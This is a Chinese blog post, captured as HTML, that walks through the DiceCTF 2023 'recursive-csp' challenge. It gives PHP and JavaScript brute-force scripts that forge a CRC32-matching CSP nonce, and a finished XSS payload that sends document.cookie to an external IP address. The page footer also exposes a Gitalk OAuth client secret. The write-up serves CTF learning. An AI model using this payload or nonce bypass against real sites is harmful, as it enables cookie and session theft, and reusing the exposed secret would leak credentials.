@@ -1,0 +1,330 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>DiceCTF2023 Web复现 | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="DiceCTF2023 Web复现 | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="recursive-csp
+
+访问/?source查看源码
+&lt;?php
+  if (isset($_GET[&quot;source&quot;])) highlight_file(__FILE__) &amp;&amp; die()..." />
+    <meta name="keywords" content="CSP,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              DiceCTF2023 Web复现
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-02-07
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+                <a href="https://le1a.github.io/tag/csp/" class="post-tag">
+                  # CSP
+                </a>
+              
+                <a href="https://le1a.github.io/tag/asK-y0e-9sI/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="recursive-csp">recursive-csp</h1>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/02/07/f4839d31b098f.png" alt="1675739795243.png" loading="lazy"></figure>
+<p>访问<code>/?source</code>查看源码</p>
+<pre><code class="language-php">&lt;?php
+  if (isset($_GET[&quot;source&quot;])) highlight_file(__FILE__) &amp;&amp; die();
+
+  $name = &quot;world&quot;;
+  if (isset($_GET[&quot;name&quot;]) &amp;&amp; is_string($_GET[&quot;name&quot;]) &amp;&amp; strlen($_GET[&quot;name&quot;]) &lt; 128) {
+    $name = $_GET[&quot;name&quot;];
+  }
+
+  $nonce = hash(&quot;crc32b&quot;, $name);
+  header(&quot;Content-Security-Policy: default-src 'none'; script-src 'nonce-$nonce' 'unsafe-inline'; base-uri 'none';&quot;);
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;recursive-csp&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;h1&gt;Hello, &lt;?php echo $name ?&gt;!&lt;/h1&gt;
+    &lt;h3&gt;Enter your name:&lt;/h3&gt;
+    &lt;form method=&quot;GET&quot;&gt;
+      &lt;input type=&quot;text&quot; placeholder=&quot;name&quot; name=&quot;name&quot; /&gt;
+      &lt;input type=&quot;submit&quot; /&gt;
+    &lt;/form&gt;
+    &lt;!-- /?source --&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>获取一个name参数，长度需要小于128才会将name参数获取到的值传给<code>$name</code></p>
+<p>然后计算<code>$name的hash</code>，后面使用了CSP，我们nonce的值就是<code>$name的hash</code></p>
+<p>如果我们想要传入的xss能被正常执行，就必须得在标签里带有这个nonce，但nonce的值又随着payload的变化而变化，可以写个脚本爆破一下</p>
+<pre><code class="language-php">&lt;?php
+$printables = &quot;0123456789abcdef&quot;;
+for ($a=0; $a&lt;strlen($printables);$a++){
+    $target = &quot;&quot;;
+    for ($b=0; $b&lt;strlen($printables);$b++){
+        for ($c=0; $c&lt;strlen($printables);$c++){
+            for ($d=0; $d&lt;strlen($printables);$d++){
+                for ($e=0; $e&lt;strlen($printables);$e++){
+                    for ($f=0; $f&lt;strlen($printables);$f++){
+                        for ($g=0; $g&lt;strlen($printables);$g++){
+                            for ($h=0; $h&lt;strlen($printables);$h++){
+                                $aa=substr($printables,$a,1);
+                                $bb=substr($printables,$b,1);
+                                $cc=substr($printables,$c,1);
+                                $dd=substr($printables,$d,1);
+                                $ee=substr($printables,$e,1);
+                                $ff=substr($printables,$f,1);
+                                $gg=substr($printables,$g,1);
+                                $hh=substr($printables,$h,1);
+                                $target = $aa.$bb.$cc.$dd.$ee.$ff.$gg.$hh;
+                                $script = &quot;&lt;script nonce=$target&gt;location.href='https://101.43.66.67:12345/?flag='+document.cookie&lt;/script&gt;&quot;;
+                                if (hash(&quot;crc32b&quot;, $script)===$target){
+                                    echo hash(&quot;crc32b&quot;, $script).&quot;\n&quot;;
+                                    echo $target.&quot;\n&quot;;
+                                    die($script);
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+</code></pre>
+<p>将这个nonce设为未知数，然后来爆破hash(payload)==nonce<img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/02/07/75953b0c7954a.png" alt="1675740303067.png" loading="lazy"></p>
+<p>得到一个payload为：</p>
+<pre><code class="language-js">&lt;script nonce=ffd2d18b&gt;location.href='https://101.43.66.67:12345/?flag='+document.cookie&lt;/script&gt;
+</code></pre>
+<p>此时我们可以看到，payload里的nonce是<code>ffd2d18b</code>，这整个payload的hash也为<code>ffd2d18b</code>，即满足要求</p>
+<pre><code class="language-js">https://recursive-csp.mc.ax/?name=%3Cscript%20nonce%3Dffd2d18b%3Elocation.href%3D'https%3A%2F%2F101.43.66.67%3A12345%2F%3Fflag%3D'%2Bdocument.cookie%3C%2Fscript%3E
+</code></pre>
+<p>url编码后，放入admin bot访问即可</p>
+<p>我的脚本是爆破nonce，r3的脚本是固定一个nonce，然后在payload后追加字符使得hash值满足这个nonce。下面是r3的脚本</p>
+<pre><code class="language-js">import crc from &quot;crc/crc32&quot;;
+
+const target = &quot;e8b7be43&quot;;
+const script = `&lt;script nonce=&quot;${target}&quot;&gt;location.href='https://101.43.66.67:12345/?flag='+document.cookie&lt;/script&gt;`;
+
+const printables = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\]^_`{|}~ \t\n\r\x0b\x0c&quot;;
+
+for (const a of printables) {
+  for (const b of printables) {
+    for (const c of printables) {
+      for (const d of printables) {
+        for (const e of printables) {
+          const result = script + a + b + c + d + e;
+          const digest = crc(result).toString(16);
+          if (digest === target) {
+            console.log(result);
+            process.exit(0);
+          }
+        }
+      }
+    }
+  }
+}
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/02/07/2d206e1b233c9.png" alt="1675740569774.png" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#recursive-csp">recursive-csp</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/StaticProgramAnalysis/">
+              <h3 class="post-title">
+                Static Program Analysis
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
